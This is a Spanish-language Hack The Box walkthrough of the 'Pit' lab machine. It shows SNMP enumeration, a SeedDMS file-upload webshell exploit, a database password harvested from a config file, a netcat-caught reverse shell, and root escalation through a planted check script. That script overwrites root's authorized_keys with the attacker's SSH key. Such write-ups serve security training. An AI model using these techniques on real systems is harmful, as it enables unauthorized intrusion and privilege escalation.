---
layout: single
title: Hack The Box - Pit 
excerpt: "Pit es una máquina de dificultad media en Hack The Box. El objetivo inicial consiste en enumerar el servicio SNMP para obtener información que pueda servir como vector de ataque, como la ruta de acceso al login del servicio web y dos posibles usuarios. Una vez obtenido acceso al portal web, se explota una vulnerabilidad en el sistema de file upload, que permite la ejecución remota de comandos y la obtención de una shell.

Se utiliza TTYOverHTTP para obtener una shell más estable y con más control, lo que permite realizar un tratamiento adecuado y obtener credenciales para acceder al servicio web en el puerto 9090. Este servicio cuenta con una opción de terminal que facilita la ejecución de comandos.

Para la escalada de privilegios, se debe revisar la enumeración del servicio SNMP, ya que revela la ejecución de un script. Al analizar dicho script y utilizando getfacl, es posible escalar privilegios"
date: 2025-11-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-Pit/pit.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
  - Web Pentesting
tags:  
  - Linux
  - SeedDMS
  - SNMP
  - TtyOverHttp
  - ACLs (Access Control List) - getfacl
  - sshkeygen 

---
<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #0b101b;
    font-family: Arial, sans-serif;
    color: white;
  }

  /* Centramos únicamente los elementos visuales */
  .glitch,
  .title,
  .date,
  .info {
    text-align: center;
    margin-left: auto;
    margin-right: auto;
  }

  .glitch {
    position: relative;
    width: 90%;
    max-width: 400px;
    height: 300px;
    background-image: url("/assets/images/htb-writeup-Pit/pit.png");
    background-size: cover;
    background-position: center;
    margin: 2rem auto 1rem auto;
    overflow: hidden;
  }

  .glitch:before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-Pit/pit.png");
    background-size: cover;
    background-position: center;
    opacity: 0.5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

  .glitch:hover:before {
    animation: glitch1 1s linear infinite;
  }

  @keyframes glitch1 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 5px 0; }
    20% { background-position: -5px 0; }
    30% { background-position: 15px 0; }
    40% { background-position: -5px 0; }
    50% { background-position: -25px 0; }
    60% { background-position: -50px 0; }
    70% { background-position: 0 -20px; }
    80% { background-position: -60px -20px; }
    81% { background-position: 0 0; }
    100% { background-position: 0 0; filter: hue-rotate(360deg); }
  }

  @keyframes glitch2 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 15px 0; }
    15% { background-position: -15px 0; }
    20% { filter: hue-rotate(360deg); }
    25% { background-position: 0 0; filter: hue-rotate(0deg); }
    100% { background-position: 0 0; filter: hue-rotate(0deg); }
  }

  .title {
    font-size: 1.5rem;
    font-weight: bold;
    margin-bottom: 0.5rem;
  }

  .date {
    font-size: 1rem;
    color: #ccc;
    margin-bottom: 1rem;
  }

  .info {
    display: flex;
    justify-content: center;
    gap: 2rem;
    flex-wrap: wrap;
    margin-top: 1rem;
    font-size: 0.9rem;
  }

  .info div {
    text-align: center;
  }

  .info .label {
    color: #999;
    font-size: 0.8rem;
  }

  .icon {
    font-size: 2rem;
    color: #0f0;
    margin: 0.5rem 0;
  }

  /* Responsive */
  @media (max-width: 575.5px) {
    .glitch {
      height: 200px;
    }
    .title {
      font-size: 1.3rem;
    }
  }
</style>

<body>
    <div class="glitch">  
    </div>
</body>

<br>

`Pit` es una máquina de dificultad media en Hack The Box. El objetivo inicial consiste en enumerar el servicio SNMP para obtener información que pueda servir como vector de ataque, como la ruta de acceso al login del servicio web y dos posibles usuarios. Una vez obtenido acceso al portal web, se explota una vulnerabilidad en el sistema de file upload, que permite la ejecución remota de comandos y la obtención de una shell.

Se utiliza TTYOverHTTP para obtener una shell más estable y con más control, lo que permite realizar un tratamiento adecuado y obtener credenciales para acceder al servicio web en el puerto 9090. Este servicio cuenta con una opción de terminal que facilita la ejecución de comandos.

Para la escalada de privilegios, se debe revisar la enumeración del servicio SNMP, ya que revela la ejecución de un script. Al analizar dicho script y utilizando getfacl, es posible escalar privilegios

## Enumeración

Realizando un escaneo de puertos TCP identifique los siguientes abiertos:

- 22 SSH
- 80 HTTP
- 9090 HTTP

```bash
Nmap scan report for 10.10.10.241
Host is up, received user-set (0.21s latency).
Scanned at 2025-06-18 01:21:08 EDT for 229s

PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
80/tcp   open  http            syn-ack ttl 63 nginx 1.14.1
9090/tcp open  ssl/zeus-admin? syn-ack ttl 63
```
Realicé otro escaneo con Nmap utilizando la opción `-sVC` para obtener más información de los servicios identificados y pude obtener el dominio: `dms-pit.htb`

![](/assets/images/htb-writeup-Pit/svcpng)

Posteriormente, agregué el dominio `dms-pit.htb` y `pit.htb` al archivo `/etc/hosts`, apuntándolo a la IP de la máquina víctima, para futuros ataques.

```bash
┌──(root㉿kali)-[/home/kali]
└─# cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.10.241 dms-pit.htb pit.htb
```

## Enumeración WEB

La página web de la máquina era la siguiente:

![](/assets/images/htb-writeup-Pit/nginx.png)

Tras realizar una enumeración básica, no identifiqué nada relevante. Al revisar el puerto 9090 de la máquina, identifiqué un login de CentOS.

![](/assets/images/htb-writeup-Pit/centos.png)

Buscando la imagen en Google, vi que se trata de la tecnología **Cockpit**. Por el nombre que tiene parece que va a ser clave para la explotación

![](/assets/images/htb-writeup-Pit/google.png)

Tras continuar enumerando no identifique algo de utilidad por lo que realice un escaneo de puertos UDP e identifique el siguiente puerto abierto: 

- 161 SNMP

```bash
Nmap scan report for 10.10.10.241
Host is up, received user-set (0.23s latency).
Scanned at 2025-06-18 02:13:17 EDT for 0s

PORT    STATE SERVICE REASON              VERSION
161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pit.htb
```

Para enumerar SNMP utilice la string por defecto *public* desde la raiz 

```bash
┌──(root㉿kali)-[/home/kali]
└─# snmpbulkwalk -v2c -c public 10.10.10.241 1 > snmpout3
```

Una vez generado el archivo, busqué palabras clave y logré identificar la ruta absoluta de la instalación del servidor web
*/var/www/html/seeddms51x/seeddms*

```bash
┌──(root㉿kali)-[/home/kali]
└─# grep -iE "http|https|var|www" snmpout3
iso.3.6.1.2.1.25.4.2.1.4.14847 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.14848 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.14849 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.14850 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.14851 = STRING: "php-fpm: pool www"
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.27 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Al probar la ruta en ambos servicios web del dominio `pit.htb`, no se cargó ninguna vista. Sin embargo, al colocarla en el subdominio identificado previamente `dms-pit.htb`, se desplegó un panel de inicio de sesión correspondiente a la tecnología SeedDMS

![](/assets/images/htb-writeup-Pit/seed.png)

Continuando enumerando la salida de `snmpbulkwalk` identifique un posible usuario `michelle`

```bash
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
```

probando el usuario `michelle` como usuario y contraseña pude acceder al portal

![](/assets/images/htb-writeup-Pit/mic.png)

Revisando la nota dentro del panel del portal se indica que se actualizo a la versión 5.1.15 de SeedDMS lo cual se puede confirmar dando click a la nota ya que se descarga el archivo CHANGELOG 

```bash
┌──(root㉿kali)-[/home/kali]
└─# head -n 30 Downloads/CHANGELOG 
--------------------------------------------------------------------------------
                     Changes in version 5.1.15
--------------------------------------------------------------------------------
- Improved import from file system
- HTTP Proxy for access on external extension repository can be set
- Do not use unzip in ExtensionMgr anymore
- fix version compare on info page
- allow one page mode on search page
- fix import of older extension versions from repository

--------------------------------------------------------------------------------
                     Changes in version 5.1.14
--------------------------------------------------------------------------------
- allow mimetype to specify documents which can be edited online
- show number of indexing tasks in progress bar
- fix comparison of last indexing time with creation date of document content
- new hooks leftContentPre and leftContentPost
- minimize sql queries when fetching sub folders and documents of a folder
- custom attributes can be validated in a hook
- document attributes comment, keywords, categories, expiration date, and sequence
  can be turned off in the configuration
- workflows can be turned off completely
- Extension can be enabled/disabled in the extension manager, the previously
  used method by setting a parameter in the extension's config file will no
  longer work.
- clean up code for managing extensions
- fix renaming of folders via webdav
- fix list of expired documents on MyDocuments page
- pass showtree to ViewDocument (Closes: #462)
- fix upgrade script for sqlite3
```

Buscando vulnerabilidades para SeedDMS encontré `CVE-2019-12744` lo cual permite un RCE mediante la carga de un archivo no validado, esto se soluciona agregando el archivo .htaccess en apache pero como se trata de un servidor nginx es posible que este presente.

Para la explotación seguí la PoC de ExploitDB https://www.exploit-db.com/exploits/47022 para cargar mi archivo me coloque dentro del directorio de `michelle` y cargue una webshell

![](/assets/images/htb-writeup-Pit/ws.png)

Posteriormente debo consultar el archivo para poder llevar acabo la ejecución de comandos, para este punto al hacer hover sobre el documento se ve su ID en este caso 29

![](/assets/images/htb-writeup-Pit/29.png)

Finalmente pude ejecutar comandos mediante la web shell 

![](/assets/images/htb-writeup-Pit/passwd.png)

En este punto me di cuenta que al intentar ejecutar otros comandos no recibo ninguna salida

![](/assets/images/htb-writeup-Pit/salida.png)

## TTYOverHttp

En ocasiones como estas cuando tenemos la ejecución remota de comandos mediante una web shell pero hay reglas configuradas (**Ej: iptables**) que nos impiden obtener una Reverse Shell se puede usar la herramienta `TTYOverHttp` para obtener una TTY completamente interactiva y desde hay generar una reverse shell.

Para que funcione se debe agregar la ruta donde reside la web shell en el archivo de la herramienta y ejecutarla

```bash
result = (requests.get('http://dms-pit.htb/seeddms51x/data/1048576/37/1.php', params=payload, timeout=5).text).strip()
result = (requests.get('http://dms-pit.htb/seeddms51x/data/1048576/37/1.php', params=payload, timeout=5).text).strip()
```
El archivo modificado se encuentra en [TTYOverHTTP_Modificada]()

```bash
┌──(root㉿kali)-[/opt/ttyoverhttp]
└─# rlwrap python3 tty_over_http.py    
> whoami
> nginx
```
`NOTA:` Se agrega rlwrap para que permita ejecuta CTRL + L subir y bajar con las flechas, etc.

Una vez ejecutado, realizando una enumeración me encontré con un archivo interesante `settings.xml` del cual identifique credenciales

```bash
<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
```

La contraseña identificada previamente me ayudo a iniciar sesión en el portal de centOS usando el usuario michelle

![](/assets/images/htb-writeup-Pit/system.png)

Algo que llamo mi atención fue la sección terminal, al ingresar me carga una terminal donde pude enviarme una reverse shell

![](/assets/images/htb-writeup-Pit/terminal.png)

```bash
┌──(root㉿kali)-[/opt/Reverse_Shells]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from dms-pit.htb [10.10.10.241] 56504
script /dev/null -c bash
Script started, file is /dev/null
[michelle@pit ~]$ 
```

Para trabajar mas comodo realice un tratamiento de la TTY

```bash
┌──(root㉿kali)-[/opt/Reverse_Shells]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from dms-pit.htb [10.10.10.241] 56504
script /dev/null -c bash
Script started, file is /dev/null
[michelle@pit ~]$ ^Z
zsh: suspended  nc -lvp 443

┌──(root㉿kali)-[/opt/Reverse_Shells]
└─# stty raw -echo;fg
[1]  + continued  nc -lvp 443
                             reset
[michelle@pit ~]$ export TERM=xterm
[michelle@pit ~]$ export SHELL=bash
[michelle@pit ~]$ 
```

## Escalada de privilegios

Enumerando nuevamente la salida de snmpwalk veo que se ejecuta un comando: 

```bash
iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
```

Al revisar este comando desde la shell veo que se trata de un script

```bash
[michelle@pit ~]$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
[michelle@pit ~]$ 
```

Se trata de un script que ejecuta todos los scripts que esten dentro de /usr/local/monitoring/ y tengan de nombre check_cual_quier_cosa terminando en .sh (Por el uso del wildcard )

Situándome en el directorio `/usr/bin/monitor` no me deja listar los archivos sin embargo si pude crear uno

```bash
[michelle@pit ~]$ cd /usr/local/monitoring/
[michelle@pit monitoring]$ ls -la
ls: cannot open directory '.': Permission denied
[michelle@pit monitoring]$ pwd
/usr/local/monitoring
[michelle@pit monitoring]$ touch test
[michelle@pit monitoring]$ echo 'test' > test
[michelle@pit monitoring]$ cat test
test
```

Al revisar los permisos del directorio monitoring veo que tiene un `+` lo cual significa que este directorio tiene ACLs (Access Control List) adicionales así que ejecute el comando  `getfacl` y pude ver que el usuario `michelle` tiene permisos de escritura y ejecución en el directorio `monitoring` lo cual justifica por que puedo crear archivos

```bash
[michelle@pit local]$ ls -la
total 0
drwxr-xr-x. 13 root root 149 Nov  3  2020 .
drwxr-xr-x. 12 root root 144 May 10  2021 ..
drwxr-xr-x.  2 root root   6 Nov  3  2020 bin
drwxr-xr-x.  2 root root   6 Nov  3  2020 etc
drwxr-xr-x.  2 root root   6 Nov  3  2020 games
drwxr-xr-x.  2 root root   6 Nov  3  2020 include
drwxr-xr-x.  2 root root   6 Nov  3  2020 lib
drwxr-xr-x.  3 root root  17 May 10  2021 lib64
drwxr-xr-x.  2 root root   6 Nov  3  2020 libexec
drwxrwx---+  2 root root 101 Nov  5 15:05 monitoring
drwxr-xr-x.  2 root root   6 Nov  3  2020 sbin
drwxr-xr-x.  5 root root  49 Nov  3  2020 share
drwxr-xr-x.  2 root root   6 Nov  3  2020 src
``` 

```bash
[michelle@pit local]$ getfacl monitoring/
# file: monitoring/
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---

[michelle@pit local]$ 
```

Posteriormente cree un par de llaves ssh y un script que almacene dentro de /usr/local/monitoring/ el cual le da un echo a mi llave publica y la almacena en /root/.ssh/authorized_keys también imprime el mensaje it worked! si funciono la instrucción anterior para cerciorarme que se ejecuto correctamente 

```bash
┌──(root㉿kali)-[~/.ssh]
└─# ssh-keygen 
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): 
Enter passphrase for "/root/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_ed25519
Your public key has been saved in /root/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:dPY9ZMvUK3z7AzEg4Qc8vNO76LFrs9VddGgzMoxduRg root@kali
The key's randomart image is:
+--[ED25519 256]--+
|        oo.   .. |
|        .=.=E..o |
|        ..O.*oO.+|
|       . =.oo%.=o|
|        S . ooBo.|
|           ...+.o|
|         ......o |
|         ++.   ..|
|        o=+     o|
+----[SHA256]-----+
```

```bash
┌──(root㉿kali)-[~/.ssh]
└─# cat check_p3rr1n.sh 
#!/bin/bash

echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWUP8z0hPaS//nzHmsf4ggIWfseFakjvr3FFBWDHNwj root@kali' > /root/.ssh/authorized_keys && echo "SrP3rr1n" 
```

Para activar su ejecución ejecute lo siguiente:

```bash
snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

NOTA: Si muestra el mensaje de error `NET-SNMP-EXTEND-MIB::nsExtendObjects: Unknown Object Identifier` realizar la siguiente instalación `apt-get install snmp-mibs-downloader`

```bash
┌──(root㉿kali)-[~/.ssh]
└─# snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendCommand."memory" = STRING: /usr/bin/free
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
NET-SNMP-EXTEND-MIB::nsExtendArgs."memory" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."memory" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."memory" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."memory" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."memory" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."memory" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."memory" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."memory" = STRING:               total        used        free      shared  buff/cache   available
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: Database status
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."memory" = STRING:               total        used        free      shared  buff/cache   available
Mem:        4023500      568920     3125676        8824      328904     3222096
Swap:       1961980           0     1961980
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Database status
OK - Connection to database successful.
SrP3rr1n
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user
...SNIP...
```
La ejecución mostro el texto `SrP3rr1n` por lo cual funciono, por ultimo inicie sesión como root con mi llave privada 

```bash
┌──(root㉿kali)-[~/.ssh]
└─# ssh -i id_ed25519 root@10.10.10.241                                     
Web console: https://pit.htb:9090/ or https://10.10.10.241:9090/

Last login: Thu Nov  3 06:15:20 2022
[root@pit ~]# whoami
root
[root@pit ~]# 
```
